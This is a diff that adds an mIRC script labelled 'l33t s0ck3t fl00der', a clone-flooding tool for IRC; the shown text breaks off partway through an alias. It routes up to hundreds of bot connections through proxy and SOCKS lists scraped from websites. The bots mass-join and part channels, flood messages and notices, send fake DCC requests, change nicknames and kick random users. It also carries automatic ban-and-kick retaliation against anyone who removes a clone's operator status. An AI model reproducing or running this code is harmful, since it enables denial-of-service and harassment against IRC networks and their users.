@@ -1,0 +1,618 @@
+Alias Clone {
+  /dialog $iif($dialog(Clone),-c,-m) Clone Clone
+}
+dialog Clone {
+  title "l33t s0ck3t fl00der"
+  size -1 -1 422 366
+  option pixels
+  tab "Settings", 75, 8 8 404 340
+  edit "irc.littleproject.de", 2, 60 46 151 21, tab 75 autohs
+  text "Server:", 3, 20 48 34 16, tab 75
+  edit "6667", 4, 212 46 44 20, tab 75 limit 5
+  text "Protocol:", 5, 18 76 42 16, tab 75
+  combo 6, 61 70 60 68, tab 75 size drop
+  box "On Connect", 7, 19 208 238 130, tab 75
+  box "Nickname and Real Name", 8, 19 115 238 94, tab 75
+  text "Connects:", 9, 18 100 66 16, tab 75
+  edit "128", 10, 84 94 44 20, tab 75 limit 4
+  radio "Random", 11, 22 126 58 20, tab 75
+  radio "Nicklist:", 12, 22 145 54 20, tab 75
+  radio "Other:", 13, 22 166 54 20, tab 75
+  edit "", 14, 80 143 130 20, disable tab 75 autohs
+  edit "", 15, 80 164 130 20, disable tab 75 limit 10
+  button "&Browse", 16, 212 153 41 20, disable tab 75
+  text "UserMode:", 17, 34 222 50 16, tab 75
+  edit "+idxB", 18, 88 218 60 20, tab 75
+  edit "", 19, 22 253 232 80, tab 75 multi return autohs autovs
+  text "CMDs:", 20, 22 237 106 16, tab 75
+  box "Proxy/Socks List", 26, 258 38 147 300, tab 75
+  edit "", 85, 80 185 174 21, tab 75 autohs limit 70
+  text "IP:", 27, 260 58 26 16, tab 75
+  text "Port:", 28, 260 78 26 16, tab 75
+  edit "", 29, 287 53 115 20, tab 75 limit 15
+  edit "", 30, 287 74 115 20, tab 75 limit 5
+  button "Add", 31, 273 96 60 20, tab 75
+  button "Remove", 32, 333 96 60 20, tab 75
+  button "Import", 33, 273 116 60 20, tab 75
+  list 34, 260 138 142 172, tab 75 size
+  button "Remove All", 35, 260 311 142 24, tab 75
+  check "CTCP Replies", 81, 132 95 84 20, tab 75
+  text "Real Name:", 82, 22 190 56 16, tab 75
+  button "Clipboard", 83, 333 116 60 20, tab 75
+  tab "Flooding", 76
+  box "Nicklist", 37, 12 31 103 236, tab 76
+  button "Join", 41, 116 37 50 20, disable tab 76
+  edit "", 42, 167 37 60 21, tab 76 autohs
+  button "Part", 43, 116 58 50 20, disable tab 76
+  edit "", 44, 167 58 60 21, tab 76 autohs
+  edit "", 45, 228 58 178 21, tab 76 autohs
+  button "Join Part", 46, 116 79 50 20, disable tab 76
+  edit "", 47, 167 79 60 21, tab 76 autohs
+  edit "", 48, 228 79 178 21, tab 76 autohs
+  button "Message", 49, 116 100 50 20, disable tab 76
+  edit "", 50, 167 100 60 21, tab 76 autohs
+  edit "", 51, 228 100 178 21, tab 76 autohs
+  button "Notice", 52, 116 121 50 20, disable tab 76
+  edit "", 53, 167 121 60 21, tab 76 autohs
+  edit "", 54, 228 121 178 21, tab 76 autohs
+  button "Describe", 55, 116 142 50 20, disable tab 76
+  edit "", 56, 167 142 60 21, tab 76 autohs
+  edit "", 57, 228 142 178 21, tab 76 autohs
+  button "CTCP", 58, 116 163 50 20, disable tab 76
+  edit "", 59, 167 163 60 21, tab 76 autohs
+  combo 60, 228 163 60 76, tab 76 size edit drop
+  button "Send*", 61, 116 184 50 20, disable tab 76
+  edit "", 62, 167 184 60 21, tab 76 autohs
+  edit "", 63, 228 184 178 21, tab 76 autohs
+  button "Chat*", 64, 116 205 50 20, disable tab 76
+  edit "", 65, 167 205 60 21, tab 76 autohs
+  button "Nick", 66, 116 247 50 20, tab 76
+  radio "Nicklist:", 68, 169 268 54 20, tab 76
+  radio "Other:", 69, 340 226 54 20, tab 76
+  radio "Random", 67, 169 247 58 20, tab 76
+  button "Browse", 72, 340 268 50 20, disable tab 76
+  edit "", 70, 221 267 118 21, disable tab 76 autohs
+  edit "", 74, 167 226 170 21, tab 76 multi return autohs autovs
+  button "Raw", 73, 116 226 50 20, disable tab 76
+  edit "", 71,  167 226 170 21, disable tab 76 limit 10
+  list 38, 14 46 98 219, tab 76 size extsel
+  text "Perform:", 39, 11 284 42 16, tab 76
+  combo 40, 53 280 62 60, tab 76 size drop
+  text "Sockets:", 23, 12 324 92 16, tab 76
+  text "Connected:", 22, 11 307 92 16, tab 76
+  text "0", 24, 70 307 42 16, tab 76
+  text "0", 25, 70 324 42 16, tab 76
+  tab "Status", 86
+  list 123, 14 34 389 280, tab 86 size read multi vsbar hsbar
+  radio "Debug On", 87, 15 320 75 20, tab 86
+  radio "Debug Off", 88, 89 320 83 20, tab 86
+  button "Clear DeBug", 999, 190 318 100 20, tab 86
+  tab "Proxy Fetcher", 97
+  combo 98, 14 46 200 21, tab 97 size drop
+  button "&Add URL", 99, 215 47 50 20, tab 97
+  list 100, 14 70 250 79, tab 97 size drop
+  box "URL List", 101, 12 31 390 306, tab 97
+  box "Taken Proxies/Socks", 102, 14 149 146 186, tab 97
+  list 103, 17 164 140 167, tab 97 size
+  button "Export", 104, 245 200 84 20, tab 97
+  text "Total Sites:", 105, 210 260 58 16, tab 97
+  text "0", 106, 275 260 122 16, tab 97
+  button "Get List", 107, 265 120 90 20, tab 97
+  button "Move to Proxy/Socks List", 109, 160 220 169 20, tab 97
+  text "Completed:", 110, 210 280 58 16, tab 97
+  text "0", 111, 275 280 122 16, tab 97
+  text "Socks/Proxies Taken:", 112, 163 242 106 16, tab 97
+  text "0", 113, 275 242 74 16, tab 97
+  tab "Ciscos", 500
+  button "Clear", 108, 160 200 84 20, tab 97
+  button "Remove Selected", 114, 265 80 90 20, tab 97
+  button "Remove All", 115, 265 100 90 20, tab 97
+  button "&Connect", 77, 1 345 70 20
+  button "&Disconnect", 78, 71 345 70 20
+  button "&Exit", 79, 351 345 70 20
+  button "Op.BotNet", 502, 211 345 70 20
+  button "IP:Ports", 80, 281 345 70 20
+  button "Stop", 84, 141 345 70 20
+}
+on *:dialog:Clone:Init:*: {
+  Did -a $DName 6 Proxy
+  Did -a $DName 6 Sock
+  Did -c $DName 6 2
+  Did -a $DName 40 All
+  Did -a $DName 40 Selected
+  Did -c $DName 40 1
+  Did -a $DName 60 PING
+  Did -a $DName 60 TIME
+  Did -a $DName 60 VERSION
+  Did -a $DName 98 http://elite-proxies.blogspot.com
+  Did -a $DName 98 http://proxy-heaven.blogspot.com
+  Did -a $DName 98 http://www.socks24.org/
+  Did -c $DName 98 3
+  Did -c $DName 11
+  Did -c $DName 67
+}
+on *:dialog:Clone:Edit:*: {
+  If ($Did == 42) {
+    If ($Left($Did(42),1) == $Chr(35)) && ($Count($Did(42),$Chr(32)) <= 1) { Did -e $DName 41 }
+    Else { Did -b $DName 41 }
+  }
+  If ($Did == 44) {
+    If ($Left($Did(44),1) == $Chr(35)) && ($Count($Did(44),$Chr(32)) == 0) { Did -e $DName 43 }
+    Else { Did -b $DName 43 }
+  }
+  If ($Did == 47) {
+    If ($Left($Did(47),1) == $Chr(35)) && ($Count($Did(47),$Chr(32)) == 0) { Did -e $DName 46 }
+    Else { Did -b $DName 46 }
+  }
+  If ($Did == 50) {
+    If ($Count($Did(50),$Chr(32)) == 0) && ($Len($Did(50)) >= 1) && ($Did(51)) { Did -e $DName 49 }
+    Else { Did -b $DName 49 }
+  }
+  If ($Did == 51) {
+    If ($Count($Did(50),$Chr(32)) == 0) && ($Len($Did(50)) >= 1) && ($Did(51)) { Did -e $DName 49 }
+    Else { Did -b $DName 49 }
+  }
+  If ($Did == 53) {
+    If ($Count($Did(53),$Chr(32)) == 0) && ($Len($Did(53)) >= 1) && ($Did(54)) { Did -e $DName 52 }
+    Else { Did -b $DName 52 }
+  }
+  If ($Did == 54) {
+    If ($Count($Did(53),$Chr(32)) == 0) && ($Len($Did(50)) >= 1) && ($Did(54)) { Did -e $DName 52 }
+    Else { Did -b $DName 52 }
+  }
+  If ($Did == 56) {
+    If ($Count($Did(56),$Chr(32)) == 0) && ($Len($Did(56)) >= 1) && ($Did(57)) { Did -e $DName 55 }
+    Else { Did -b $DName 55 }
+  }
+  If ($Did == 57) {
+    If ($Count($Did(56),$Chr(32)) == 0) && ($Len($Did(56)) >= 1) && ($Did(57)) { Did -e $DName 55 }
+    Else { Did -b $DName 55 }
+  }
+  If ($Did == 59) {
+    If ($Count($Did(59),$Chr(32)) == 0) && ($Len($Did(59)) >= 1) && ($Did(60)) { Did -e $DName 58 }
+    Else { Did -b $DName 58 }
+  }
+  If ($Did == 60) {
+    If ($Count($Did(59),$Chr(32)) == 0) && ($Len($Did(59)) >= 1) && ($Did(60)) { Did -e $DName 58 }
+    Else { Did -b $DName 58 }
+  }
+  If ($Did == 62) {
+    If ($Count($Did(62),$Chr(32)) == 0) && ($Len($Did(62)) >= 1) && ($Left($Did(62),1) != $Chr(35)) && ($Did(63)) { Did -e $DName 61 }
+    Else { Did -b $DName 61 }
+  }
+  If ($Did == 63) {
+    If ($Count($Did(62),$Chr(32)) == 0) && ($Len($Did(62)) >= 1) && ($Left($Did(62),1) != $Chr(35)) && ($Did(63)) { Did -e $DName 61 }
+    Else { Did -b $DName 61 }
+  }
+  If ($Did == 65) {
+    If ($Count($Did(65),$Chr(32)) == 0) && ($Len($Did(65)) >= 1) && ($Left($Did(65),1) != $Chr(35)) { Did -e $DName 64 }
+    Else { Did -b $DName 64 }
+  }
+  If ($Did == 74) {
+    If ($Len($Did(74)) >= 1) { Did -e $DName 73 }
+    Else { Did -b $DName 73 }
+  }
+  If ($Did == 70) {
+    If ($Did(70)) { Did -e $DName 66 }
+    Else { Did -b $DName 66 }
+  }
+  If ($Did == 71) {
+    If ($Did(71)) { Did -e $DName 66 }
+    Else { Did -b $DName 66 }
+  }
+}
+Alias Clone.Error { Var %E = $Input($1-,o,Clone) }
+on *:dialog:Clone:SClick:*: {
+  if ($did == 502) /clone.op
+  if ($did == 503) /clone.mass $did(600)
+  if ($did == 504) /clone.stop
+  if ($did == 507) /sockwrite -n * join $did(600)
+  if ($did == 508) /sockwrite -n * part $did(600) : $+ $taketop
+  if ($did == 509) /f3us $did(600)
+  if ($did == 510) /kick.control
+  if ($did == 999) Did -r $DName 123
+
+  If ($Did == 31) {
+    If (*.*.* iswm $Did(29)) && ($Did(30) <= 65535) && ($Did(30) >= 1) { Did -a $DName 34 $Did(29) $Did(30) }
+    Else { Clone.Error Invalid Sock/Proxy or Port }
+  }
+  If ($Did == 32) && ($Did(34).Sel) { Did -d $DName 34 $Did(34).Sel }
+  If ($Did == 33) {
+    Var %F = $SFile($mIRCDir,Clone,Import)
+    If (%F) {
+      Var %I = 1
+      While ($Read(%F,%I)) {
+        Var %F1 = $Read(%F,%I)
+        If ($Gettok(%F1,0,58) == 2) { Var %F1 = $Replace(%F1,$Chr(58),$Chr(32)) }
+        If ($Gettok(%F1,0,32) != 2) || ($Abs($Gettok(%F1,2,32)) == 0) { Clone.Error Invalid Sock/Proxy file | Return }
+        Else { Did -a $DName 34 %F1 }
+        Inc %I
+      }
+    }
+  }
+  If ($Did == 83) {
+    Var %I = 1
+    While ($CB(%I)) {
+      Var %F1 = $CB(%I)
+      If ($Gettok(%F1,0,58) == 2) { Var %F1 = $Replace(%F1,$Chr(58),$Chr(32)) }
+      If ($Gettok(%F1,0,32) != 2) || ($Abs($Gettok(%F1,2,32)) == 0) { Clone.Error Invalid Socks/Proxys in Clipboard | Return }
+      Else { Did -a $DName 34 %F1 }
+      Inc %I
+    }
+  }
+  If ($Did == 35) { Did -r $DName 34 }
+  If ($Did == 11) { Did -b $DName 14 | Did -b $DName 15 | Did -b $DName 16 }
+  If ($Did == 12) { Did -e $DName 14 | Did -b $DName 15 | Did -e $DName 16 }
+  If ($Did == 13) { Did -b $DName 14 | Did -e $DName 15 | Did -b $DName 16 }
+  If ($Did == 67) { Did -b $DName 70 | Did -b $DName 71 | Did -b $DName 72 | Did -e $DName 66 }
+  If ($Did == 68) {
+    Did -e $DName 70 | Did -b $DName 71 | Did -e $DName 72
+    If ($Did(70)) { Did -e $DName 66 }
+    Else { Did -b $DName 66 }
+  }
+  If ($Did == 69) {
+    Did -b $DName 70 | Did -e $DName 71 | Did -b $DName 72
+    If ($Did(71)) { Did -e $DName 66 }
+    Else { Did -b $DName 66 }
+  }
+  If ($Did == 16) {
+    Var %F = $SFile($mIRCDir,Clone,Import)
+    If (%F) { Did -ra $DName 14 %F }
+  }
+  If ($Did == 72) {
+    Var %F = $SFile($mIRCDir,Clone,Import)
+    If (%F) { Did -ra $DName 70 %F | Did -e $DName 66 }
+  }
+  If ($Did == 60) {
+    If ($Count($Did(59),$Chr(32)) == 0) && ($Len($Did(59)) >= 1) && ($Did(60)) { Did -e $DName 58 }
+    Else { Did -b $DName 58 }
+  }
+  If ($Did == 41) { Clone.Do $Did(40) JOIN $Did(42) }
+  If ($Did == 43) { Clone.Do $Did(40) PART $Did(44) : $+ $Did(45) }
+  If ($Did == 46) { Clone.Do $Did(40) JOINPART $Did(47) : $+ $Did(48) }
+  If ($Did == 49) { Clone.Do $Did(40) PRIVMSG $Did(50) : $+ $Did(51) }
+  If ($Did == 52) { Clone.Do $Did(40) NOTICE $Did(53) : $+ $Did(54) }
+  If ($Did == 55) { Clone.Do $Did(40) PRIVMSG $Did(56) :ACTION $Did(57) $+  }
+  If ($Did == 58) { Clone.Do $Did(40) PRIVMSG $Did(59) : $+ $Did(60) $+  }
+  If ($Did == 61) { Clone.Do $Did(40) PRIVMSG $Did(62) :DCC SEND $Did(63) $Rand(0,4294967294) 1024 $Rand(10000,500000) $+  }
+  If ($Did == 64) { Clone.Do $Did(40) PRIVMSG $Did(65) :DCC CHAT chat $Rand(0,4294967294) 1024 }
+  If ($Did == 66) { Clone.Do $Did(40) NICK }
+  If ($Did == 73) {
+    Var %I = 1
+    While ($Did(74,%I)) { Clone.Do $Did(40) RAW $Did(74,%I) | Inc %I }
+  }
+  If ($Did == 77) {
+    If (!$Did(34,1)) && (($Did(6) == Proxy) || ($Did(6) == Sock)) { Clone.Error Enter $Did(6) to the $Did(6) list }
+    ElseIf (*.*.* !iswm $Did(2)) { Clone.Error Enter a valid Server }
+    ElseIf ($Did(4) <= 0) && ($Did(4) >= 65535) { Clone.Error Enter a valid Port }
+    ElseIf (!$Did(10)) || ($Did(10) !isnum) { Clone.Error Enter the number clones to connect }
+    ElseIf ($Did(12).State == 1) && ($Exists($Did(14)) == $False) { Clone.Error Nicklist doesnt Exist }
+    ElseIf ($Did(13).State == 1) && (!$Did(15)) { Clone.Error Enter a Nickname }
+    ElseIf ($Did(6) == Sock) && ($Remove($Did(2),.) !isnum) { .Enable #Clone.DNS | .DNS $Did(2) }
+    Else { .TimerClone.Go $Did(10) 0 Clone.Go }
+  }
+  If ($Did == 78) { Did -r $DName 38 | Did -ra $DName 24 0 | Did -ra $DName 25 0 | SockClose Clone.* | Unset %Clone.* | /fo }
+  If ($Did == 79) { SockClose Clone.* | Dialog -x $DName }
+  If ($Did == 80) { Clone.IPs }
+  If ($Did == 84) {
+    Var %I = 1
+    While ($Sock(Clone.*,%I)) {
+      If (!$Sock(Clone.*,%I).Mark) { SockClose $Sock(Clone.*,%I) }
+      Inc %I
+    }
+    Did -ra Clone 25 $Sock(Clone.*,0)
+  }
+  If ($Did == 99) {
+    Did -a $DName 100 $Did(98)
+    Did -ra $DName 106 $Calc($Did(106) + 1)
+  }
+  If ($Did == 104) {
+    Var %F = $Input(Enter Filename:,ego,Clone)
+    If (%F) {
+      Var %I = 1
+      While ($Did(103,%I)) { Write %F $Did(103,%I) | Inc %I }
+    }
+  }
+  If ($Did == 107) {
+    Did -ra $DName 111 0
+    Var %I = 1
+    While ($Did(100,%I)) {
+      SockQueue CloneGet. [ $+ [ %I ] ] $Gettok($Remove($Did(100,%I),http://,www.),1,47) 80
+      Set %Clone.Get.URL. [ $+ [ %I ] ] $Gettok($Remove($Did(100,%I),http://,www.),1,47)
+      Set %Clone.Get.Ext. [ $+ [ %I ] ] $Iif($Gettok($Remove($Did(100,%I),http://,www.),2-,47),$Chr(47) $+ $Gettok($Remove($Did(100,%I),http://,www.),2-,47),$Chr(47))
+      Inc %I
+    }
+  }
+  If ($Did == 108) { Did -r $DName 103 }
+  If ($Did == 109) {
+    Did -r $DName 34
+    Var %I = 1
+    While ($Did(103,%I)) { Did -a $DName 34 $Replace($Did(103,%I),$Chr(58),$Chr(32)) | Inc %I }
+  }
+  If ($Did == 114) && ($Did(100).Sel) { Did -d $DName 100 $Did(100).Sel }
+  If ($Did == 115) { Did -r $DName 100 }
+}
+on *:SockOpen:CloneGet.*: {
+  SockWrite -n $SockName GET %Clone.Get.EXT. [ $+ [ $Gettok($SockName,2,46) ] ] HTTP/1.0
+  SockWrite -n $SockName Accept: */*
+  SockWrite -n $SockName Host: www. $+ %Clone.Get.URL. [ $+ [ $Gettok($SockName,2,46) ] ]
+  SockWrite -n $SockName Connection: Keep-Alive
+  SockWrite -n $SockName
+  Unset %Clone.Get.EXT. [ $+ [ $Gettok($SockName,2,46) ] ]
+  Unset %Clone.Get.URL. [ $+ [ $Gettok($SockName,2,46) ] ]
+}
+on *:SockRead:CloneGet.*: {
+  SockRead %R
+  If $WildTok(%R,*.*.*.*:*,1,32) && ($Remove($WildTok(%R,*.*.*.*:*,1,32),$Chr(46),$Chr(58)) isnum) {
+    Did -a Clone 103 $WildTok(%R,*.*.*.*:*,1,32)
+    Did -ra Clone 113 $Calc($Did(Clone,113) + 1)
+  }
+  Unset %R
+}
+Alias SockQueue {
+  If ($Sock(CloneGet.*,0) <= 6) { SockOpen $1- }
+  Else { Set %Clone.Queue. [ $+ [ $Rand(1,9999999) ] ] $1- }
+}
+On *:SockClose:CloneGet.* {
+  If ($Var(%Clone.Queue.*,1)) {
+    SockOpen $Var(%Clone.Queue.*,1).Value
+    Unset $Var(%Clone.Queue.*,1)
+  }
+  Did -ra Clone 111 $Calc($Did(Clone,111) + 1)
+}
+#Clone.DNS off
+on *:DNS: {
+  If ($RAddress) { Did -ra Clone 2 $RAddress | .TimerClone.Go $Did(Clone,10) 0 Clone.Go }
+  Else { Clone.Error Unable to resolve DNS of $Did(Clone,10) }
+  .Disable #Clone.DNS
+  Halt
+}
+#Clone.DNS End
+Alias Clone.Do {
+  If ($1 == All) {
+    Var %I = 1
+    While ($Sock(Clone.*,%I)) {
+      If ($2 == JOINPART) { SockWrite -nt $Sock(Clone.*,%I) JOIN $3 | SockWrite -nt $Sock(Clone.*,%I) PART $3- }
+      ElseIf ($2 == RAW) { SockWrite -nt $Sock(Clone.*,%I) $Replace($3-,^Nick^,$Clone.Nick($Sock(Clone.*,%I))) }
+      ElseIf ($2 == NICK) {
+        If ($Did(Clone,67).State == 1) { SockWrite -nt $Sock(Clone.*,%I) NICK $Clone.RandNick }
+        If ($Did(Clone,68).State == 1) { SockWrite -nt $Sock(Clone.*,%I) NICK $Gettok($Read($Did(Clone,70)),1,32) }
+        If ($Did(Clone,69).State == 1) { SockWrite -nt $Sock(Clone.*,%I) NICK $Did(Clone,71) $+ $Clone.RandNick(4) }
+      }
+      ElseIf ($2 == KICK) {
+        set %kicknickall $nick($3,0)
+        set %kicknick $nick($3,$rand(1,%kicknickall))
+        if (%kicknick == Q) || (%kicknick == L) || ($me isin %kicknick) || ($protnick(%kicknick) == ON) || ($clonenick(%kicknick) == ON) goto aaa
+
+        SockWrite -nt $Sock(Clone.*,%I) $2 $3 %kicknick : $+ $takekick
+
+        :aaa
+      }
+      Else { SockWrite -nt $Sock(Clone.*,%I) $2- }
+      Inc %I
+    }
+  }
+  If ($1 == Selected) {
+    Var %I = 1
+    While ($Did(Clone,38,%I)) {
+      If ($Did(Clone,38,%I).State == 1) {
+        Var %J = 1
+        While ($Sock(Clone.*,%J)) {
+          If ($Sock(Clone.*,%J).Mark == $Did(Clone,38,%I)) {
+            If ($2 == JOINPART) { SockWrite -nt $Sock(Clone.*,%J) JOIN $3 | SockWrite -nt $Sock(Clone.*,%J) PART $3- }
+            ElseIf ($2 == RAW) { SockWrite -nt $Sock(Clone.*,%J) $Replace($3-,^Nick^,$Clone.Nick($Sock(Clone.*,%J))) }
+            ElseIf ($2 == NICK) {
+              If ($Did(Clone,67).State == 1) { SockWrite -nt $Sock(Clone.*,%J) NICK $Clone.RandNick }
+              If ($Did(Clone,68).State == 1) { SockWrite -nt $Sock(Clone.*,%J) NICK $Gettok($Read($Did(Clone,70)),1,32) }
+              If ($Did(Clone,69).State == 1) { SockWrite -nt $Sock(Clone.*,%J) NICK $Did(Clone,71) }
+            }
+            Else { SockWrite -nt $Sock(Clone.*,%J) $2- }
+          }
+          Inc %J
+        }
+      }
+      Inc %I
+    }
+  }
+}
+Alias Clone.Conn { If ($Did(Clone,38,1)) { Return $Did(Clone,38).Lines } }
+on *:SockOpen:Clone.*: {
+  If ($SockErr) { SockClose $SockName | Did -ra Clone 25 $Sock(Clone.*,0) | Return }
+  If (Clone.Sock.* iswm $SockName) { BSet &Clone 1 5 1 0 | SockWrite $SockName &Clone }
+  If (Clone.Proxy.* iswm $SockName) {
+    SockWrite $SockName CONNECT $+($Did(Clone,2),:,$Did(Clone,4)) HTTP/1.1
+    SockWrite $SockName $CRLF $+ $CRLF $+ $CRLF
+    Clone.Conn.User $SockName
+  }
+  If (Clone.Normal.* iswm $Sockname) { Clone.Conn.User $SockName }
+  Did -ra Clone 25 $Sock(Clone.*,0)
+}
+on *:SockRead:Clone.*: {
+  If ($SockErr) { SockClose $SockName | Did -ra Clone 25 $Sock(Clone.*,0) | Return }
+  If (Clone.Sock.* iswm $SockName) && (!$Sock($SockName).Mark) {
+    SockRead &Read
+    If ($BVar(&Read,1,2) == 5 0) && ($BVar(&Read,3) != 0) {
+      Var %Port = $Gettok($LongIP($Did(Clone,4)),3,46) $Gettok($LongIP($Did(Clone,4)),4,46)
+      Var %Serv = $Replace($Did(Clone,2),$Chr(46),$Chr(32))
+      BSet &Clone.Send 1 5 1 0 1 %Serv %Port
+      SockWrite $SockName &Clone.Send
+    }
+    If ($BVar(&Read,1,3) == 5 0 0) { SockMark $SockName 1 | Clone.Conn.User $SockName }
+  }
+  SockRead %Clone.Read
+  If (%Clone.Read && $did(clone,87).state == 1) { did -a clone 123 %clone.read }
+  Tokenize 32 %Clone.Read
+  Unset %Clone.Read
+  If (*<HTML>* iswm $1-) && (!$Sock($SockName).Mark) {
+    SockClose $SockName
+  }
+  If ($1 == PING) { SockWrite -nt $SockName PONG : $+ $Remove($2,:) }
+  If ($2 == PRIVMSG) && ($Did(Clone,81).State == 1) {
+    If ($4 == :FINGER) { SockWrite -nt $SockName NOTICE $Remove($Gettok($1,1,33),:) :FINGER $FReply($Rand(1,5)) $+  }
+    If ($4 == :PING) { SockWrite -nt $SockName NOTICE $Remove($Gettok($1,1,33),:) :PING $5 }
+    If ($4 == :TIME) { SockWrite -nt $SockName NOTICE $Remove($Gettok($1,1,33),:) :TIME $ASCTime($Calc($Rand($Calc($CTime - 10000),$Calc($CTime + 10000)))) $+  }
+    If ($4 == :VERSION) { SockWrite -nt $SockName NOTICE $Remove($Gettok($1,1,33),:) :VERSION $VReply($Rand(1,10)) $+  }
+    If ($4 == :FINGER) { SockWrite -nt $SockName NOTICE $Remove($Gettok($1,1,33),:) :FINGER $FReply($Rand(1,10)) $+  }
+  }
+  If (($2 == MODE) && (-oooooooooooo iswm $4)) { SockWrite -nt $SockName Mode $3 +oooooooooooo $5-  }
+  If (($2 == MODE) && (-ooooooooooo iswm $4)) { SockWrite -nt $SockName Mode $3 +ooooooooooo $5-  }
+  If (($2 == MODE) && (-oooooooooo iswm $4)) { SockWrite -nt $SockName Mode $3 +oooooooooo $5-  }
+  If (($2 == MODE) && (-ooooooooo iswm $4)) { SockWrite -nt $SockName Mode $3 +ooooooooo $5-  }
+  If (($2 == MODE) && (-oooooooo iswm $4)) { SockWrite -nt $SockName Mode $3 +oooooooo $5-  }
+  If (($2 == MODE) && (-ooooooo iswm $4)) { SockWrite -nt $SockName Mode $3 +ooooooo $5-  }
+  If (($2 == MODE) && (-oooooo iswm $4)) { SockWrite -nt $SockName Mode $3 +oooooo $5-  }
+  If (($2 == MODE) && (-ooooo iswm $4)) { SockWrite -nt $SockName Mode $3 +ooooo $5-  }
+  If (($2 == MODE) && (-oooo iswm $4)) { SockWrite -nt $SockName Mode $3 +oooo $5-  }
+  If (($2 == MODE) && (-ooo iswm $4)) { SockWrite -nt $SockName Mode $3 +ooo $5-  }
+  If (($2 == MODE) && (-oo iswm $4)) { SockWrite -nt $SockName Mode $3 +oo $5-  }
+  If (($2 == MODE) && (-o iswm $4)) { SockWrite -nt $SockName Mode $3 +o $5-  }
+  If (($2 == MODE) && (-o iswm $4)) { SockWrite -nt $SockName Mode $3 +oooooooooooooooooooooo $5- | SockWrite -tn Clone.Sock.* MODE $3 +b $remove($Gettok($1,1,33), :) | SockWrite -nt $SockName Kick $3 $remove($Gettok($1,1,33), :) }
+
+  If ($2 == 001) {
+    Var %I = 1
+    While ($Did(Clone,19,%I)) { SockWrite -nt $SockName $Replace($Did(Clone,19,%I),^Nick^,$3) | Inc %I }
+    If ($3) { Did -a Clone 38 $3 }
+    Did -ra Clone 24 $Iif($Clone.Conn,$Clone.Conn,0)
+    SockWrite -nt $SockName Mode $3 $Did(Clone,18)
+    SockMark $SockName $3
+  }
+  If ($2 == 433) {
+    If ($Sock($SockName).Mark) && ($Sock($SockName).Mark != 1) {
+      If ($Did(Clone,67).State == 1) { .TimerClone. [ $+ [ $SockName ] ] 1 1 SockWrite -nt $SockName NICK $Clone.RandNick }
+      If ($Did(Clone,68).State == 1) { .TimerClone. [ $+ [ $SockName ] ] 1 1 SockWrite -nt $SockName NICK $Read($Did(Clone,70)) }
+      If ($Did(Clone,69).State == 1) { .TimerClone. [ $+ [ $SockName ] ] 1 1 SockWrite -nt $SockName NICK $Did(Clone,71) $+ $Clone.RandNick(2) }
+    }
+    Else {
+      If ($Did(Clone,11).State == 1) { .TimerClone. [ $+ [ $SockName ] ] 1 1 SockWrite -nt $SockName NICK $Clone.RandNick }
+      If ($Did(Clone,12).State == 1) { .TimerClone. [ $+ [ $SockName ] ] 1 1 Clone.Conn.User $SockName }
+      If ($Did(Clone,13).State == 1) { .TimerClone. [ $+ [ $SockName ] ] 1 1 SockWrite -nt $SockName NICK $Did(Clone,15) $+ $Clone.RandNick(2) }
+    }
+  }
+  If ($2 == NICK) && ($Remove($Gettok($1,1,33),:) == $Sock($SockName).Mark) {
+    Var %I = 1
+    While ($Did(Clone,38,%I)) {
+      If ($Did(Clone,38,%I) == $Remove($Gettok($1,1,33),:)) { Did -o Clone 38 %I $Remove($3,:) }
+      Inc %I
+    }
+    SockMark $SockName $Remove($3,:)
+  }
+  Did -ra Clone 25 $Sock(Clone.*,0)
+}
+Alias Clone.Ignore {
+  Var %I = 1
+  While ($Did(Clone,96,%I)) {
+    If ($Did(Clone,96,%I) iswm $Remove($1,$Chr(58))) { Return $Did(Clone,96,%I) }
+    Inc %I
+  }
+}
+on *:dialog:Clone.IPs:Init:*: { Clone.IPs }
+on *:dialog:Clone.IPs:SClick:2: { Clone.IPs }
+on *:SockClose:Clone.*: {
+  If ($Sock($SockName).Mark) && ($Sock($SockName).Mark != 1) {
+    Var %I = 1
+    While ($Did(Clone,38,%I)) {
+      If ($Did(Clone,38,%I) == $Sock($SockName).Mark) { Did -d Clone 38 %I }
+      Inc %I
+    }
+  }
+  Did -ra Clone 25 $Sock(Clone.*,0)
+  Did -ra Clone 24 $Iif($Clone.Conn,$Clone.Conn,0)
+}
+Alias Clone.Nick { Return $Sock($1).Mark }
+Alias Clone.Sock {
+  Var %I = 1
+  While ($Sock(Clone.*,%I)) {
+    If ($Sock(Clone.*,%I).Mark == $1) { Return $Sock(Clone.*,%I) }
+    Inc %I
+  }
+}
+Alias Clone.RandNick {
+  Var %I = $Iif($1,$1,$Rand(24,39)), %J = 1
+  While (%J <= %I) { Var %C = $Rand(1,0), %N = %N $+ $Iif(%C == 1,$Rand(A,Z),$Rand(a,z)) | Inc %J }
+  Return %N
+}
+Alias Clone.Conn.User {
+  If ($Did(Clone,11).State == 1) {
+    SockWrite -nt $1 USER $Lower($Clone.RandNick) "" "" : $+ $Iif($Did(Clone,85),$Did(Clone,85),$Clone.RandNick($Rand(20,70)))
+    SockWrite -nt $1 NICK $Clone.RandNick
+  }
+  If ($Did(Clone,12).State == 1) {
+    Var %N = $Gettok($Read($Did(Clone,14)),1,32)
+    SockWrite -nt $1 USER $lower($clone.randnick) "" "" : $+ $lower($clone.randnick)
+    SockWrite -nt $1 NICK %N
+  }
+  If ($Did(Clone,13).State == 1) {
+    SockWrite -nt $1 USER $Lower($Did(Clone,15)) "" "" : $+ $Iif($Did(Clone,85),$Did(Clone,85),$Did(Clone,15))
+    SockWrite -nt $1 NICK $Did(Clone,15) $+ $Clone.RandNick(2)
+  }
+}
+;$Iif($Did(Clone,85),$Did(Clone,85),%N)
+Alias Clone.Go {
+  If (!$Did(Clone,34,%Clone.List)) { Set %Clone.List 1 }
+  :Again
+  Var %R = $Rand(0,9999999)
+  If ($Sock($+(Clone.,$Did(Clone,6),.,%R))) { Goto Again }
+  If ($Did(Clone,6) == Normal) { SockOpen Clone.Normal. $+ %R $Did(Clone,2) $Did(Clone,4) }
+  Else { SockOpen $+(Clone.,$Did(Clone,6),.,%R) $Did(Clone,34,%Clone.List) }
+  Inc %Clone.List
+  Did -ra Clone 25 $Sock(Clone.*,0)
+}
+Dialog -l Clone.IPs {
+  title "Connected IP Ports"
+  size -1 -1 254 360
+  option Pixels
+  edit "", 1, 8 8 236 317, read multi hsbar vsbar
+  button &Refresh List, 2, 8 332 235 20
+}
+
+Alias Clone.IPs {
+  If (!$Dialog(Clone.IPs)) { Dialog -md Clone.IPs Clone.IPs }
+  Did -r Clone.IPs 1
+  Var %I = 1
